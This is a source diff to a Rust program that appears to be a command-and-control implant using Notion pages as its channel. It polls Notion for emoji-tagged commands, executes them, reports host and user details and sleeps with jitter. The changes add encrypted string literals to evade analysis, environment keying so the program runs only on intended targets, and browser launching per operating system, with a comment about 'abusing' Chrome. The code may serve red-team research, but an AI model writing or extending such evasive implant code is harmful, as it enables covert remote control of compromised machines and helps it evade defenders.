@@ -4,7 +4,7 @@ extern crate tokio;
 extern crate serde_json;
 extern crate whoami;
 extern crate base64;
-
+extern crate litcrypt;
 
 use std::{thread, time};
 use std::env::args;
@@ -16,6 +16,7 @@ use whoami::hostname;
 use reqwest::Client;
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 use base64::decode;
+use litcrypt::{lc, use_litcrypt};
 
 mod config;
 use config::{
@@ -31,12 +32,15 @@ use notion::{get_blocks, complete_command, create_page, send_result};
 mod cmd;
 use cmd::{NotionCommand, CommandType};
 mod logger;
+use logger::log_out;
+mod env_check;
 
+use_litcrypt!();
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
-    println!("[*] Starting!");
+    println!("{}", lc!("[*] Starting!"));
     
     // Handle config options
     let mut config_options: ConfigOptions;
@@ -76,24 +80,43 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Start Notion App if configured to do so
     if config_options.launch_app {
-        logger.info("Launching app".to_string());
-        let browser_cmd: &str;
+        logger.info(log_out!("Launching app"));
+        let browser_cmd: String;
         #[cfg(windows)] {
-            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
+            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string();
         }
-        #[cfg(not(windows))] {
-            browser_cmd = "/usr/local/bin/google-chrome";
+        #[cfg(target_os = "linux")] {
+            browser_cmd = lc!("/usr/local/bin/google-chrome");
+            match Command::new(browser_cmd)
+            .arg("--app=https://notion.so")
+            .spawn() {
+                Ok(_) => {logger.info(lc!("Launching browser"));},
+                Err(e) => {logger.err(e.to_string());}
+            };
         }
-        match Command::new(browser_cmd)
-        .arg("--app=https://notion.so")
-        .spawn() {
-            Ok(_) => {logger.info("Launching browser".to_string());},
-            Err(e) => {logger.err(e.to_string());}
-        };
+        #[cfg(target_os = "macos")] {
+            // For Mac, since we can't launch Chrome, we're gonna have to 
+            // Hope Chrome is there for us to abuse.
+            browser_cmd = lc!("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome");
+            match Command::new(browser_cmd)
+            .arg("--app=https://notion.so")
+            .spawn() {
+                Ok(_) => {logger.info(lc!("Launching browser"));},
+                Err(e) => {logger.err(e.to_string());}
+            };
+        }
     }
-    
-    let mut hn = hostname();
 
+    // Before anything else happens, we key to the env if the config has been set.
+    // match the keyed results. This is boiled down to a bool to account for any type of keying (by username, domain, etc)
+    if env_check::check_env_keys(&config_options).await {
+        logger.info(log_out!("Keys match; continuing..."))
+    } else {
+        logger.crit(log_out!("Env check failure. Shutting down..."));
+        exit(1)
+    }
+
+    let mut hn = hostname();
     let username = whoami::username();
     hn.push_str(" | ");
     hn.push_str(&username);
@@ -103,7 +126,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         hn.push_str("*");
     }
 
-    logger.info(format!("Hostname: {hn}"));
+    logger.info(log_out!("Hostname: ", &hn));
     logger.debug(format!("Config options: {:?}", config_options));
 
     let mut headers = HeaderMap::new();
@@ -114,7 +137,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .default_headers(headers)
         .build()?;
 
-    let page_id = create_page(&client, &config_options, hn, &logger)
+    let page_id = create_page(&client, &config_options, hn, &logger, is_admin)
         .await
         .unwrap();
     
@@ -138,7 +161,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
-                        logger.info(format!("Got command: {s}"));
+                        logger.info(log_out!("Got command: ", s));
                         let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
@@ -165,7 +188,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             time::Duration::from_secs(config_options.sleep_interval + jitter_time);
 
         thread::sleep(sleep_time);
-        logger.info(format!("zzzZZZzzz: {} seconds", config_options.sleep_interval));
-        logger.debug(format!("Jitter: {}", config_options.jitter_time));
+        logger.info(log_out!("zzzZZZzzz: ", &config_options.sleep_interval.to_string(), "seconds"));
+        logger.debug(log_out!("Jitter: ", &config_options.jitter_time.to_string()));
     }
 }
